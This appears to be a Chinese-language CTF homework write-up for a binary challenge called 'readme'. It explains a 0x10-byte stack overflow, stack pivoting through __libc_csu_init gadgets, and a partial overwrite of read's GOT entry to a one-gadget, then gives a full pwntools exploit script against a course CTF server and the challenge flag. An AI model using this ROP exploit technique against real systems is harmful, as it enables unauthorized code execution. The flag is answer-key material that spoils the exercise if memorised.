hw3
===

## readme

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### concept

觀察發現主程式非常的簡單，使用 read 來讀取輸入，不過 buf 大小為 0x20 bytes 卻可以讀入 0x30 bytes 造成 overflow

![](https://i.imgur.com/5yCKKAP.png)

因為可以 overflow 的大小有限，只有 0x10 bytes 而已，能夠做的事只有蓋 rbp 和 return address，所以需要使用 stack pivoting 的技巧來塞 rop chain

主要想法是先透過以下兩個 gadget 控 rdx，把 r12 + rbx * 8 的值設為 ret 的 gadget 並且 rbp 設為 1，即可使 call 完回到原本的 gadget 而且通過 cmp 不會跳到 __libc_csu_init + 0x40，而 rdx 的值就會設為 r13

![](https://i.imgur.com/0uut4dG.png)

![](https://i.imgur.com/hh1J9vw.png)

接著將 read_got 後 2 bytes 蓋為附近的 one gadget，最後 call read 即可

![](https://i.imgur.com/AWQ4YCy.png)

![](https://i.imgur.com/TfVIGBH.png)

不過因為有 ASLR 的關係 libc address 除了後 1.5 bytes 之外其他都是 random 的數值，所以只有 1/16 的機會可以成功 exploit

### exploit

```python
#!/usr/bin/env python

from pwn import *
import time

r = remote("csie.ctf.tw", 10135)
# r = process('./readme', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")})
context.arch = 'amd64'

main_read = 0x40062b
read_got = 0x601020
read_plt = 0x0000000004004c0
buf1 = 0x00602000 - 0x200
buf2 = buf1 - 0x200

pop_r12__pop_r13__pop_r14__pop_r15 = 0x4006ac
mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15 = 0x400690
pop_rsi_r15 = 0x00000000004006b1
pop_rdi = 0x00000000004006b3
leave = 0x400646
ret = 0x0000000000400499

def write_rop(addr, data):
    time.sleep(0.5)
    r.send('a' * 32 + flat([addr + 0x20, main_read]))
    time.sleep(0.5)
    r.send(data.ljust(32, '\x00') + flat(buf1 + 0x20, main_read))

rop = flat([
    0x1,

    pop_r12__pop_r13__pop_r14__pop_r15,
    buf2 + 19 * 0x8,
    0x2,
    0x0,
    0x0,
    mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,

    pop_rsi_r15,
    read_got,
    0,
    read_plt,

    read_plt,

    ret
    ])

r.recvuntil(':')
r.send('a' * 32 + flat([buf1, main_read]))

for i in range(0, len(rop), 32):
    write_rop(buf2 + i, rop[i: i + 32])

time.sleep(0.5)
r.send('a' * 32 + flat([buf2, leave]))
time.sleep(0.5)
r.send('\x74\x02')

r.interactive()
```

### flag

```FLAG{CAN_YOU_R34D_MY_M1ND?}```
